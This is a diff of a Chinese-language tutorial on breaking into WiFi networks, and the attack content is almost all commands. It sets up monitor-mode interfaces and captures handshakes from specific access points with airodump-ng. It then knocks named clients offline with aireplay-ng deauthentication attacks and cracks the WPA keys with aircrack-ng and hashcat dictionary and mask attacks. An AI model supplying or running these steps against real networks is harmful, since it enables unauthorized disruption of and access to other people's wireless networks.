@@ -43,13 +43,13 @@ wifi down
 ```shell
 #供扫描2.4G wifi用
 iw phy phy0 interface add mon24 type monitor
+#启用该接口
 ip link set mon24 up 
 #供扫描5G wifi用
 iw phy phy0 interface add mon5 type monitor
-ip link set mon5 up 
 #启用该接口
-ip link set mon24 up 
 ip link set mon5 up 
+
 #查看是否添加成功
 iw dev
 ```
@@ -74,7 +74,7 @@ phy#0
 	Interface mon24
 		ifindex 14
 		wdev 0x6
-		addr cc:2d:53:73:71:7b
+		addr cc:2d:53:23:21:2b
 		type monitor
 		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
 		txpower 29.00 dBm
@@ -82,7 +82,7 @@ phy#0
 	Interface mon5
 		ifindex 13
 		wdev 0x5
-		addr aa:24:22:79:73:7b
+		addr aa:24:22:29:23:2b
 		type monitor
 		channel 36 (5180 MHz), width: 20 MHz (no HT), center1: 5180 MHz
 		txpower 29.00 dBm
@@ -121,7 +121,7 @@ airodump-ng   -c 6 --bssid EA:9B:4B:A6:0C:6C -w /root/xx --ignore-negative-one  
 #设置5G wifi
 iw dev mon5 set freq 5180
 #监听5G频率wifi
-airodump-ng   -c 36 --bssid 50:0F:F5:66:E9:35 -w /root/xx --ignore-negative-one  mon5
+airodump-ng   -c 153 --bssid 4C:22:66:F1:28:00 -w /root/xx --ignore-negative-one  mon5
 ```
 
 解释：  
@@ -136,9 +136,10 @@ airodump-ng   -c 36 --bssid 50:0F:F5:66:E9:35 -w /root/xx --ignore-negative-one 
 
 ```shell
 #断开连接2.4G wifi的客户端
-aireplay-ng -0 5 -c  16:51:FB:CD:7A:7E  -a   3E:41:A0:44:E8:43    --ignore-negative-one    mon24
+aireplay-ng -0 5 -c  16:51:FB:CD:2A:2E  -a   3E:41:A0:44:E8:43    --ignore-negative-one    mon24
 #断开连接5G wifi的客户端
-aireplay-ng -0 5 -c  9A:F7:27:4E:9B:C6  -a  8C:53:C3:84:15:F7    --ignore-negative-one    mon5
+aireplay-ng -0 5 -c  FC:84:12:05:98:4F   -a  4C:22:66:F1:28:00    --ignore-negative-one    mon5
+aireplay-ng -0 5 -c 20:8F:42:22:E2:31   -a  4C:22:66:F1:28:00    --ignore-negative-one    mon5
 
 ```
 
@@ -175,7 +176,10 @@ hcxpcapngtool -o output.hc22000 xx-02.cap #这里转换格式是为了方便导�
 
 ```shell
 #使用aircrack-ng简单跑字典
-aircrack-ng -w dict.txt simple-12345678.hc22000
+aircrack-ng -w dict.txt simple-12345628.hc22000
+#使用hashcat简单跑字典
+hashcat -m 22000 simple-12345628.hc22000 rockyou.txt  --potfile-disable 
+
 
 #使用hashcat 掩码暴力破解
 hashcat -m 22000 output.hc22000 -a 3 '?d?d?d?d?d?d?d?d' --potfile-disable  #8位纯数字
